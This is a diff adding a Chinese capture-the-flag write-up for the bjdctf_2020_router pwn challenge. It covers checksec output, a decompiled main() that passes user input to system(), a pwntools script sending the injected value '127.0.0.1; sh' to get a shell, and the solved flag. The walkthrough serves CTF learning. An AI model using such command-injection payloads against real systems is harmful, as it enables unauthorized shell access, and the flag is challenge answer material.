@@ -846,6 +846,104 @@ io.interactive()
 
 ------
 
+### [bjdctf_2020_router](https://buuoj.cn/challenges#bjdctf_2020_router)
+
+先`file ./bjdctf_2020_router  `查看文件类型，再`checksec --file=./bjdctf_2020_router  `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./bjdctf_2020_router       
+./bjdctf_2020_router: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41f17252e18bfaccd3440389de0dd5697148c91f, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./bjdctf_2020_router       
+[*] '/home/tyd/ctf/pwn/pwnthebox/bjdctf_2020_router'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。输入`1`是`ping`，并且`1`是直接`system()`系统调用输出的字符串，我们可以在此拼接上`sh`获得靶机`shell`权限。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-74h] BYREF
+  char buf[16]; // [rsp+10h] [rbp-70h] BYREF
+  char dest[8]; // [rsp+20h] [rbp-60h] BYREF
+  __int64 v7; // [rsp+28h] [rbp-58h]
+  int v8; // [rsp+30h] [rbp-50h]
+  char v9; // [rsp+34h] [rbp-4Ch]
+  char v10[56]; // [rsp+40h] [rbp-40h] BYREF
+  unsigned __int64 v11; // [rsp+78h] [rbp-8h]
+
+  v11 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  *(_QWORD *)dest = 0x20676E6970LL;
+  v7 = 0LL;
+  v8 = 0;
+  v9 = 0;
+  v4 = 0;
+  puts("Welcome to BJDCTF router test program! ");
+  while ( 1 )
+  {
+    menu();
+    puts("Please input u choose:");
+    v4 = 0;
+    __isoc99_scanf("%d", &v4);
+    switch ( v4 )
+    {
+      case 1:
+        puts("Please input the ip address:");
+        read(0, buf, 0x10uLL);
+        strcat(dest, buf);
+        system(dest);
+        puts("done!");
+        break;
+      case 2:
+        puts("bibibibbibibib~~~");
+        sleep(3u);
+        puts("ziziizzizi~~~");
+        sleep(3u);
+        puts("something wrong!");
+        puts("Test done!");
+        break;
+      case 3:
+        puts("Please input what u want to say");
+        puts("Your suggest will help us to do better!");
+        read(0, v10, 0x3AuLL);
+        printf("Dear ctfer,your suggest is :%s", v10);
+        break;
+      case 4:
+        puts("Hey guys,u think too much!");
+        break;
+      case 5:
+        puts("Good Bye!");
+        exit(-1);
+      default:
+        puts("Functional development!");
+        break;
+    }
+  }
+}
+```
+
+编写`Python`代码解得`flag{d8dc77b9-ebba-4da1-b459-2f23fd1fc1bc}`，提交即可。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 29833)
+io.sendlineafter('Please input u choose:', b'1')
+io.sendlineafter('Please input the ip address:', b'127.0.0.1; sh')
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
@@ -2972,8 +3070,6 @@ io.interactive()
 ```
 
 ------
-
-
 
 
 
